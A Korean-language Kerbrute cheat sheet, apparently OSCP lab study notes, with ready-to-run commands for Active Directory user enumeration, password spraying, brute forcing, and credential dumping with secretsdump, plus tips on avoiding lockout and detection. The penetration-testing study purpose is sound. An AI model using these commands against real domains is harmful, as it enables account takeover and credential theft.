# Kerbrute

## 설치

```bash
# 최신 버전 확인 후 다운로드
wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64 -O kerbrute
chmod +x kerbrute
sudo mv kerbrute /usr/local/bin/
```

## 사용법

### 1. UserEnum - 계정 존재 여부 확인

```bash
# 1) 사용자 목록으로 확인 (가장 많이 쓰는 형식)
# uerenum -> 사용자 존재여부를 확인할 때 사용하는 고정 타입 옵션
./kerbrute userenum --dc 10.10.206.91 -d spookysec.local -o found_users.txt /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt

# 2) 빠른 확인 (내장 워드리스트)
./kerbrute userenum --dc 10.10.10.175 -d megacorp.local /opt/useful/SecLists/Usernames/Names/names.txt

# 3) 스레드 조정 - 빠른 스캔 (더 많은 요청)
./kerbrute userenum --dc 10.10.10.175 -d megacorp.local -t 80 users.txt

# 4) 스레드 줄이기 - 스텔스 스캔 (덜 눈에 띔)
./kerbrute userenum --dc 10.10.10.175 -d megacorp.local -t 1 --delay 500 users.txt
```

❗ **결과 해석**: `[+]` = 계정 존재, `[-]` = 없음, `[!]` = Pre-Auth 필요 없음(ASREProast 가능)

### 2. PasswordSpray - 패스워드 스프레이 공격

```bash
# 1) 기본 스프레이 (가장 많이 쓰는 형식)
./kerbrute passwordspray --dc 10.10.10.175 -d megacorp.local found_users.txt 'Company2023!'

# 2) 계정 잠금 방지 (안전모드)
./kerbrute passwordspray --dc 10.10.10.175 -d megacorp.local --safe -t 1 found_users.txt 'Spring2023!'

# 3) 흔한 기업 비밀번호 예시
./kerbrute passwordspray --dc 10.10.10.175 -d megacorp.local found_users.txt 'Password123!'
./kerbrute passwordspray --dc 10.10.10.175 -d megacorp.local found_users.txt 'Welcome1'
./kerbrute passwordspray --dc 10.10.10.175 -d megacorp.local found_users.txt 'Autumn2023!'
./kerbrute passwordspray --dc 10.10.10.175 -d megacorp.local found_users.txt 'CompanyName123'

# 4) 성공한 계정 저장 (결과 파일)
./kerbrute passwordspray --dc 10.10.10.175 -d megacorp.local -o valid_creds.txt found_users.txt 'Password123!'
```

❗ **이점**: 일반 로그인(4625)이 아닌 TGT요청(4768)으로 기록 → 계정 잠금 정책 우회 용이

### 3. Bruteforce - 특정 사용자 패스워드 공격

```bash
# 1) 표준 브루트포스 (가장 많이 쓰는 형식) - ⚠️ 계정 잠금 위험!
./kerbrute bruteforce --dc 10.10.10.175 -d megacorp.local /usr/share/wordlists/rockyou.txt administrator

# 2) 안전 모드 (계정 잠금 방지 - 매우 중요)
./kerbrute bruteforce --safe -t 1 --delay 1000 --dc 10.10.10.175 -d megacorp.local common_passwords.txt svc_account

# 3) 소규모 워드리스트로 특정 계정 공략 (추천)
cat << EOF > likely_passwords.txt
Spring2023!
Summer2023!
Company123!
Password123
Welcome123
P@ssw0rd
EOF
./kerbrute bruteforce --dc 10.10.10.175 -d megacorp.local likely_passwords.txt administrator
```

❗ **주의**: 브루트포스는 계정 잠금 정책 트리거 가능성 높음 → 소규모/정확한 리스트 사용

### 4. Combo - 사용자:패스워드 조합 시도

```bash
# 1) 기본 콤보 공격 (가장 많이 쓰는 형식)
./kerbrute combo --dc 10.10.10.175 -d megacorp.local combos.txt

# 2) 결과 저장 (성공한 계정 기록)
./kerbrute combo --dc 10.10.10.175 -d megacorp.local -o found_accounts.txt combos.txt

# 3) 콤보 파일 생성 예시
cat << EOF > combos.txt
administrator:Password123!
administrator:Admin123
svc_backup:Backup2023!
svc_account:Svc123!
helpdesk:Welcome123
john.doe:Password123
jane.smith:Winter2023!
EOF

# 4) 다른 도구로 콤보 파일 생성
awk '{print $1":Password123!"}' users.txt > combos.txt
awk '{print $1":Summer2023!"}' users.txt >> combos.txt
```

### 5. 실전 활용 예시

```bash
# 1) 요청한 예시 명령 - 특정 사용자리스트로 계정 확인 (최신 문법)
./kerbrute userenum --dc 10.10.10.175 --domain spookysec.local userlist.txt

# 2) 획득한 계정으로 인증 및 티켓 저장
./kerbrute -d spookysec.local --dc 10.10.206.91 -t 1 --user svc_backup --password backup2023 --tgt /tmp/svc_backup.ccache

# 3) TGT 저장 후 환경변수 설정
export KRB5CCNAME=/tmp/svc_backup.ccache

# 4) 이후 다른 도구와 연계 (impacket 등)
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -k -dc-ip 10.10.10.175 spookysec.local/svc_backup@DC01.spookysec.local
```

## 핵심 옵션

| 옵션            | 설명                         | 예시                 |
| --------------- | ---------------------------- | -------------------- |
| `-d, --domain`  | 타겟 도메인 (필수)           | `-d megacorp.local`  |
| `--dc`          | 도메인 컨트롤러 IP           | `--dc 10.10.10.175`  |
| `-o, --output`  | 결과 파일 저장               | `-o found_users.txt` |
| `--safe`        | 계정 잠금 방지 (딜레이 추가) | `--safe`             |
| `-t, --threads` | 동시 요청 수 (기본:10)       | `-t 1` 또는 `-t 50`  |
| `--delay`       | 요청 사이 지연 시간(ms)      | `--delay 1000`       |
| `-v`            | 상세 출력 (디버깅)           | `-v`                 |
| `--debug`       | 매우 상세한 정보 표시        | `--debug`            |

## 완전한 공격 시나리오

### 1. 초기 정찰 - 빠른 계정 발견

```bash
# 1) 초기 빠른 스캔 - 기본 계정
./kerbrute userenum --dc 10.10.10.175 -d megacorp.local -t 50 /usr/share/seclists/Usernames/top-usernames-shortlist.txt

# 2) 이메일 주소로부터 사용자명 추출
cat << EOF > emails.txt
john.doe@megacorp.local
jane.smith@megacorp.local
admin@megacorp.local
support@megacorp.local
EOF
cut -d "@" -f1 emails.txt > users.txt

# 3) 확장 스캔 - 더 많은 계정 찾기
./kerbrute userenum --dc 10.10.10.175 -d megacorp.local -t 30 -o found_users.txt /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
```

### 2. 전략적 패스워드 공격

```bash
# 1) 서비스 계정만 추출 (권한 높을 가능성)
grep "^svc_\|^service\|^admin" found_users.txt > service_accounts.txt

# 2) 계절+년도 비밀번호 스프레이 (가장 흔한 패턴)
for season in Spring Summer Fall Autumn Winter; do
    for year in 2022 2023; do
        echo "시도: $season$year!"
        ./kerbrute passwordspray --dc 10.10.10.175 -d megacorp.local --safe -t 1 service_accounts.txt "$season$year!"
    done
done

# 3) 회사명 + 숫자 조합 (매우 효과적)
./kerbrute passwordspray --dc 10.10.10.175 -d megacorp.local service_accounts.txt "Megacorp123!"
```

### 3. 획득한 인증으로 추가 공격

```bash
# 1) 성공한 계정 확인
cat valid_creds.txt

# 2) 비밀번호 재사용 공격 (발견된 계정 비밀번호로 다른 계정 시도)
found_password=$(cat valid_creds.txt | grep "SUCCESS" | head -1 | awk '{print $4}')
./kerbrute passwordspray --dc 10.10.10.175 -d megacorp.local found_users.txt "$found_password" -o more_accounts.txt

# 3) Kerberos 티켓 획득 및 활용
user=$(cat valid_creds.txt | grep "SUCCESS" | head -1 | cut -d " " -f 3 | cut -d "@" -f 1)
pass=$(cat valid_creds.txt | grep "SUCCESS" | head -1 | awk '{print $4}')

# TGT 요청해서 추가 공격 (이후 Kerberoasting, AS-REP Roasting 등)
export KRB5CCNAME=/tmp/$user.ccache
getTGT.py -dc-ip 10.10.10.175 megacorp.local/$user:"$pass"
```

## OSCP 시험 주의사항

❗ **중요 팁**:

- 계정 잠금 정책은 보통 5-10회 실패 시 30분 잠김 → `--safe` + `-t 1` + `--delay 1000` 사용
- 비밀번호 패턴: `회사명+123!`, `계절+년도!`, `Welcome1` 시도 (가장 성공률 높음)
- 발견된 계정은 impacket의 GetUserSPNs.py, secretsdump.py로 추가 공격
- 이벤트 ID 4768(TGT 요청)로 로그 남지만 일반 로그인보다 덜 탐지됨
